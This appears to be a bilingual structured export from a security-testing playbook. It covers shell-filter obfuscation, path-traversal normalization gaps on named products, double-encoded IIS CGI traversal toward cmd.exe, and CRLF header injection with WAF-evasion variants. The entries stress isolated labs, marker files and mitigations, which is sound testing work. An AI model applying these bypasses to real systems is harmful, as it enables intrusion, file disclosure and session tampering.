description.zh: 使用未初始化变量、引号分割和通配路径验证命令执行入口是否在过滤后仍被 Shell 重新组合为可执行命令。
description.en: Uses unset variables, quote splitting, and globbed paths to determine whether a shell reconstructs executable commands after input filtering.

subCategory.zh: Shell 分词与通配符绕过

overview.zh: Shell 分词与路径通配混淆针对命令执行入口在过滤后仍被 Shell 重新组合为可执行命令的场景：未初始化变量、引号分割与通配路径在词法阶段恢复语义。验证四类混淆样例在对应 Shell 输入点的行为。
overview.en: Shell tokenization and path globbing obfuscation targets execution entries where the shell reassembles filtered input into executable commands: uninitialized variables, quote splitting, and globbed paths restore semantics during lexical stages. It validates four obfuscation sample classes at their matching shell entry points.

vulnerability.zh: 根因是应用通过 shell 字符串拼接调用系统命令，并试图用替换或正则阻断危险词；空变量可切开关键字，引号可在解析后消失，问号通配符可匹配路径字符，使静态过滤与实际执行语义分离。
vulnerability.en: The root cause is invoking system commands via shell string concatenation while trying to block dangerous words with replacements or regexes; empty variables can split keywords, quotes vanish after parsing, and question-mark globs match path characters—static filtering and actual execution semantics diverge.

exploitation.zh: 按第 1 步逐条把混淆样例用于对应的 Shell 输入点，先把文件目标替换为测试容器中的无敏感标记文件、网络地址替换为隔离监听器；命中判据为样例经分词/通配重组后仍执行并返回对应输出（cat 内容或回连请求）。逐条记录 Shell 展开后的实际 argv；过滤层放行而命令未执行的差异一并留存作为规则盲区证据。
exploitation.en: Per step 1, apply the obfuscation samples to their matching shell entry points one by one, first replacing file targets with desensitized marker files in the test container and network addresses with isolated listeners; a hit is samples still executing after tokenization/glob reassembly and returning corresponding output (cat contents or callback requests). Record the shell's actual post-expansion argv per sample; keep filter-pass versus non-execution differences as rule-blind-spot evidence.

mitigation.zh: 不要通过 Shell 解释用户输入；调用固定可执行文件并使用参数数组，服务端对每个参数实施类型和允许列表校验；以低权限、只读文件系统和出站网络限制运行，部署子进程监控，并保留这组词法变体作为回归用例。修复后重放第 1 步全部样例。
mitigation.en: Never let a shell interpret user input; invoke fixed executables with argument arrays and type/allowlist-validate every parameter server-side; run with low privilege, read-only filesystems, and egress restrictions, deploy child-process monitoring, and keep this lexeme set as regression cases. After the fix, replay all step-1 samples.

title.zh: 确认 Shell 解释边界

description.zh: 通过代码或进程遥测确认输入进入 shell -c 等解释路径，而不是安全参数数组。
description.en: Use code or process telemetry to confirm that input reaches shell -c or equivalent rather than a safe argument array.

description.zh: 在隔离容器中把目标替换为无敏感标记，逐条提交并捕获过滤结果与实际 argv。
description.en: Replace targets with nonsensitive markers in an isolated container, submit each line, and capture filter output and actual argv.

description.zh: 把请求 ID 与进程树、argv、文件访问或受控网络连接关联，排除仅过滤告警的假阳性。
description.en: Correlate request IDs with process trees, argv, file access, or controlled connections to exclude filter-only alerts.

description.zh: 改用固定程序和参数数组后重放样例，确认正常参数仍工作且不再产生额外子进程。
description.en: Switch to a fixed executable and argument array, then replay samples to preserve valid behavior without extra child processes.

prerequisites.zh: 用户输入可能进入 Unix Shell 命令上下文
prerequisites.en: User input may reach a Unix shell command context.

prerequisites.zh: 隔离测试环境允许执行无副作用的命令验证
prerequisites.en: An isolated test environment permits side-effect-free command verification.

analysis.zh: 核心证据是应用进程实际启动了非预期子进程或解释出不同 argv。过滤器放行、错误响应或命令文本出现在页面中只能说明输入处理差异。
analysis.en: The decisive evidence is an unexpected child process or reconstructed argv from the application. Filter acceptance, errors, or command text in a page only show input-handling differences.

opsecTips.zh: 在一次性容器中用无敏感标记文件替代系统账户文件，并禁用到公网的出站访问。
opsecTips.en: Use a disposable container with a nonsensitive marker file in place of account files and block public-network egress.

opsecTips.zh: 不在生产请求中启动交互式 Shell；网络型样例只连接隔离测试监听器。
opsecTips.en: Do not launch interactive shells in production requests; network samples may connect only to an isolated test listener.

name.zh: 路径遍历过滤与规范化差异
name.en: Path Traversal Filter and Normalization Differentials

description.zh: 使用点号变体、双重编码和产品特定下载路由验证边界过滤与后端文件路径规范化是否一致。
description.en: Uses dot variants, double encoding, and product-specific download routes to verify consistent path normalization between edge filters and backend file handlers.

overview.zh: 路径遍历过滤与规范化差异针对边界过滤与后端文件路径规范化不一致的场景：产品特定下载路由各自存在解码差异。验证点号变体、双重编码与产品路由样例在边界与后端两层的结论。
overview.en: Path traversal filter and normalization differentials target boundary filtering disagreeing with backend file-path normalization: product-specific download routes each carry decoding gaps. It contrasts boundary versus backend conclusions across dot variants, double encoding, and product route samples.

vulnerability.zh: 根因是对原始字符串做黑名单过滤，却在后端进行额外 URL 解码、点段折叠、别名解析或平台路径转换；产品插件若把查询参数直接拼入文件 API，重复编码或非标准点号会在后续阶段恢复父目录跳转。
vulnerability.en: The root cause is blacklist filtering on raw strings while backends perform extra URL decoding, dot-segment folding, alias resolution, or platform path conversion; when product plugins splice query parameters into file APIs, repeated encodings or non-standard dots restore parent-directory jumps in later stages.

exploitation.zh: 按第 1 步按目标技术栈逐条选择样例使用（/tmui/... 的 F5 路由、.asp 的 IIS 变体、ithemes-sync-request 的 WordPress 参数等），并把敏感文件替换为隔离标记；命中判据为某一变体在边界放行且后端返回标记内容。产品特定 URL 不应无差别发送到其他框架；逐条记录边界解码值与后端最终路径的两层对照。
exploitation.en: Per step 1, select samples matching the target stack (the F5 /tmui/... route, the .asp IIS variant, the ithemes-sync-request WordPress parameter, etc.), replacing sensitive files with isolated markers; a hit is a variant passing the boundary while the backend returns marker content. Never send product-specific URLs indiscriminately to other frameworks; record the two-layer contrast of boundary-decoded values versus final backend paths per sample.

mitigation.zh: 把用户标识映射到服务端对象 ID，不接受任意路径；必须处理路径时，完成全部解码后解析规范绝对路径并验证其位于固定根目录，拒绝符号链接越界；同时升级存在已知问题的产品组件，WAF 规则仅作补充。修复后重放第 1 步全部样例。
mitigation.en: Map user identifiers to server-side object IDs and never accept arbitrary paths; when paths must be handled, resolve canonical absolute paths after completing all decoding, verify they sit in a fixed root, and forbid symlink escape; upgrade product components with known issues while treating WAF rules as supplemental. After the fix, replay all step-1 samples.

description.zh: 根据路由、版本和正常请求确认实际文件 API，避免向无关技术栈发送产品特定路径。
description.en: Use routes, versions, and normal requests to identify the actual file API and avoid sending product-specific paths to unrelated stacks.

title.zh: 提交匹配的规范化样例

description.zh: 把文件目标替换为隔离标记后逐条请求，记录原始值、边界解码值和后端规范路径。
description.en: Replace file targets with an isolated marker, request each sample, and record raw, edge-decoded, and backend-canonical paths.

description.zh: 通过标记内容或文件访问遥测证明最终打开路径越过允许根目录，并排除自定义 404。
description.en: Use marker content or file-access telemetry to prove the opened path escapes the allowed root and exclude custom 404 responses.

description.zh: 完成根目录校验与组件升级后重放合法文件和全部匹配样例，确认只有允许对象可访问。
description.en: After root enforcement and component updates, replay valid files and all matching samples to confirm only allowed objects remain accessible.

prerequisites.zh: 目标路由接受文件名、模板名或资源路径
prerequisites.en: The target route accepts a filename, template name, or resource path.

prerequisites.zh: 测试环境提供位于允许目录外的无敏感标记文件
prerequisites.en: The test environment provides a nonsensitive marker file outside the allowed directory.

analysis.zh: 每行必须结合对应产品与实际文件 API 解释。最强证据是规范化后的真实文件路径和标记读取，单纯 WAF 放行或响应长度变化不构成文件读取。
analysis.en: Interpret each line in the context of its product and file API. Canonical path and marker-file access are strong evidence; WAF acceptance or response-length change alone is not a file read.

opsecTips.zh: 先替换所有系统文件路径为测试标记，避免在验证过程中读取真实配置或账户数据。
opsecTips.en: Replace every system-file target with a test marker before validation to avoid reading real configuration or account data.

opsecTips.zh: 仅对已识别组件使用对应 URL，降低无关日志噪声与潜在服务压力。
opsecTips.en: Use product-specific URLs only against identified components to reduce irrelevant logs and service load.

name.zh: IIS CGI 双重编码路径遍历

description.zh: 使用双重编码点段访问 Windows CGI 路径，验证边界代理与 IIS/CGI 处理器是否执行不同次数的 URL 解码。
description.en: Uses double-encoded dot segments against a Windows CGI path to test whether the edge proxy and IIS or CGI handler perform different numbers of URL-decoding passes.

overview.zh: IIS CGI 双重编码路径遍历针对边界代理与 IIS/CGI 处理器执行不同次数 URL 解码的场景：%25 解码后的点段在下游再次恢复为父目录。验证双重编码 CGI 路径在两层的解码与到达差异。
overview.en: IIS CGI double-encoded path traversal targets boundary proxies and IIS/CGI handlers decoding different numbers of times: dot segments restored after %25 decoding recover parent-directory meaning downstream. It contrasts two-layer decoding and reachability of double-encoded CGI paths.

vulnerability.zh: 根因是代理按一次解码后的路径做访问控制，而 IIS/CGI 再次解码并规范化，导致受保护路径在两层具有不同含义；若旧 CGI 可执行系统命令，影响进一步放大。
vulnerability.en: The root cause is proxies enforcing access control on once-decoded paths while IIS/CGI decode and normalize again, giving protected paths different meanings at the two layers; legacy CGIs able to execute system commands amplify the impact further.

exploitation.zh: 第 1 步原行保留用于来源核对，真实验证把 cmd.exe 与 dir 操作替换为隔离实例中的无副作用标记 CGI 后提交 /cgi/%252E%252E%252F… 路径；命中判据为双重编码点段在下游解码后到达非预期 CGI 并返回标记输出。逐条记录边界层与 IIS 层各自看到的解码值；现代服务器阴性时记录版本号，不把历史行为套到当前目标。
exploitation.en: Keep the step-1 original for source verification, but for real validation replace cmd.exe and the dir operation with a harmless marker CGI in an isolated instance before submitting /cgi/%252E%252E%252F… paths; a hit is double-encoded dot segments reaching the unintended CGI downstream and returning marker output. Record decoded values seen at the boundary layer versus the IIS layer per request; when modern servers are negative, note the version and never assume historical behavior for the current target.

mitigation.zh: 升级受支持 IIS/Windows 版本，移除不需要的 CGI 映射，在边界和后端使用相同的单次规范化路径并拒绝重复编码；Web 服务身份最小权限，系统目录不可映射到 Web 路径，并保留双重解码回归。修复后重放第 1 步路径，确认被统一拒绝。
mitigation.en: Upgrade to supported IIS/Windows versions, remove unneeded CGI mappings, apply identical single-pass normalization at boundary and backend, and reject repeated encodings; run the web identity least-privileged, keep system directories unmapped from web paths, and retain double-decoding regression. After the fix, replay the step-1 path and confirm uniform rejection.

title.zh: 确认 IIS/CGI 测试环境
title.en: Confirm the IIS or CGI test environment

description.zh: 记录版本、代理层、解码次数和无副作用测试 CGI 的规范路径。
description.en: Record version, proxy layers, decode passes, and the canonical path of a side-effect-free test CGI.

title.zh: 提交改写后的双重编码路径

description.zh: 用标记 CGI 替换系统命令目标并保留每层路径日志。
description.en: Replace the OS-command target with a marker CGI and preserve path logs at every layer.

title.zh: 确认非预期处理器调用

description.zh: 匹配请求 ID、规范路径、CGI 日志和固定标记，排除错误页与静态文件。
description.en: Match request ID, canonical path, CGI log, and fixed marker, excluding error pages and static files.

description.zh: 修复后重放规范和双重编码路径，确认合法 CGI 保留且越界路径拒绝。
description.en: After remediation replay canonical and double-encoded paths to preserve valid CGI while rejecting traversal.

prerequisites.zh: 目标已确认是授权测试中的旧式 IIS/CGI 路径
prerequisites.en: The target is a confirmed legacy IIS or CGI path in an authorized test environment.

prerequisites.zh: 隔离 Windows 实例提供无副作用测试 CGI 与路径审计
prerequisites.en: An isolated Windows instance provides a side-effect-free test CGI and path auditing.

analysis.zh: 必须证明至少两层解码差异和非预期 CGI 调用。原 URL 中出现 cmd.exe 只说明历史目标，不构成现代 RCE 证据。
analysis.en: Prove at least two decoding passes and unintended CGI invocation. cmd.exe in the historical URL does not establish modern RCE.

opsecTips.zh: 只在隔离复现环境使用标记 CGI，不请求真实 cmd.exe 或执行 dir。
opsecTips.en: Use a marker CGI only in an isolated reproduction and never request real cmd.exe or run dir.

opsecTips.zh: 每次只发送一个路径并限制日志保留范围，避免旧服务不稳定。
opsecTips.en: Send one path at a time and limit log retention to avoid destabilizing legacy services.

name.zh: CRLF 响应头注入

description.zh: 通过编码 CRLF 注入 Content-Type、Location 或 Set-Cookie，验证用户输入是否能越过响应头边界并改变浏览器处理。
description.en: Uses encoded CRLF sequences to inject Content-Type, Location, or Set-Cookie and verify whether input crosses the response-header boundary.

subCategory.zh: 暴露面与 HTTP 攻击

overview.zh: CRLF 响应头注入针对用户输入越过响应头边界的场景：编码 CRLF 可注入 Content-Type、Location 或 Set-Cookie 并改变浏览器处理。验证三类注入样例在已确认头参数上的原始响应结构。
overview.en: CRLF response header injection targets user input crossing the response-header boundary: encoded CRLF can inject Content-Type, Location, or Set-Cookie and change browser handling. It validates raw response structure across the three injection sample classes on confirmed header parameters.

vulnerability.zh: 根因是响应头 API 接收包含 CR、LF 或解码后控制字符的值，并且代理、框架和服务器在不同阶段解码；输入因此可能终止原头并创建新的 Content-Type、Location 或 Set-Cookie。
vulnerability.en: The root cause is header APIs accepting values containing CR, LF, or decoded control characters while proxies, frameworks, and servers decode at different stages; input can therefore terminate the original header and create new Content-Type, Location, or Set-Cookie entries.

exploitation.zh: 按第 1 步把 %0d%0aContent-Type、%0d%0aLocation 与 %0d%0aSet-Cookie 样例逐条放入已确认会进入响应头的测试参数，使用自有测试来源与无敏感 Cookie 并检查原始响应头结构；命中判据为响应头出现注入的 Location/Set-Cookie 或正文被拆分为第二个响应。记录各层（服务器、代理、框架）的头生成结果；仅页面出现换行不算命中，必须以原始头结构为证。
exploitation.en: Per step 1, place the %0d%0aContent-Type, %0d%0aLocation, and %0d%0aSet-Cookie samples into confirmed header-bound test parameters one by one, using your own test origins with no sensitive cookies while inspecting raw response headers; a hit is injected Location/Set-Cookie headers appearing or the body splitting into a second response. Record header generation results per layer (server, proxy, framework); a mere newline on the page is not a hit—raw header structure is the evidence.

mitigation.zh: 只使用框架提供的结构化响应头 API，拒绝 CR、LF、NUL 及其多次解码形式；重定向使用规范化允许列表，Cookie 由固定服务端代码生成，并在代理与应用之间统一一次解码策略和回归测试。修复后重放第 1 步样例，确认头结构不变。
mitigation.en: Use only framework-structured header APIs, rejecting CR, LF, NUL, and their multi-decoded forms; allowlist redirects with normalization, generate cookies solely from fixed server code, and unify single-decode policy plus regression tests across proxy and application. After the fix, replay the step-1 samples and confirm header structure is unchanged.

description.zh: 确认参数进入哪个响应头，并捕获正常值经过代理和应用后的原始响应基线。
description.en: Identify the response header receiving the parameter and capture raw baseline bytes after proxy and application processing.

title.zh: 逐条提交 CRLF 样例

description.zh: 分别尝试媒体类型、跳转与无敏感 Cookie 头，保持其余请求字段不变。
description.en: Try media-type, redirect, and nonsensitive cookie headers separately while holding all other request fields constant.

description.zh: 在原始响应字节和浏览器状态中确认新增头，排除仅回显、日志污染和客户端解码。
description.en: Confirm added headers in raw bytes and browser state, excluding reflection, log pollution, and client-only decoding.

description.zh: 拒绝控制字符后重放正常值与全部编码样例，确认业务响应保持且无法创建新头。
description.en: After rejecting control characters, replay normal values and all encodings to preserve behavior without creating headers.

prerequisites.zh: 用户输入会进入响应头值或重定向目标
prerequisites.en: User input reaches a response-header value or redirect target.

prerequisites.zh: 可捕获代理后的原始 HTTP 响应
prerequisites.en: The raw HTTP response after proxy processing can be captured.

analysis.zh: 以原始 HTTP 字节和浏览器采纳结果为准。代理规范化前的日志、应用层字符串或单纯状态码变化都是间接证据。
analysis.en: Use raw HTTP bytes and browser acceptance as authoritative evidence. Pre-normalization logs, application strings, and status changes are indirect.

opsecTips.zh: 使用测试 Cookie 名和自有空白域，避免覆盖真实会话或跳转到第三方。
opsecTips.en: Use a test cookie name and controlled empty domain to avoid overwriting real sessions or redirecting to third parties.

opsecTips.zh: 在非共享缓存对象上验证，防止注入响应被其他用户命中。
opsecTips.en: Test on a nonshared-cache object so an injected response cannot be served to other users.

description.zh: 仅用 %0a 绕过同时匹配 %0d%0a 的规则，多数解析器接受裸 LF 换头；成功判据：响应出现注入的响应头。
description.en: Uses %0a alone to evade rules matching the %0d%0a pair; many parsers accept bare LF. Success: the injected header appears in the response.

description.zh: U+560A U+560D 在部分归一化管线还原为 CRLF，规避字节级 %0d%0a 检测；成功判据：服务端还原后响应头被注入。
description.en: U+560A U+560D normalize to CRLF in some pipelines, evading byte-level %0d%0a detection. Success: the server materializes the injected header.

description.zh: 双重编码绕过一次解码后再匹配 CRLF 的 WAF；成功判据：应用二次解码后响应头注入成功。
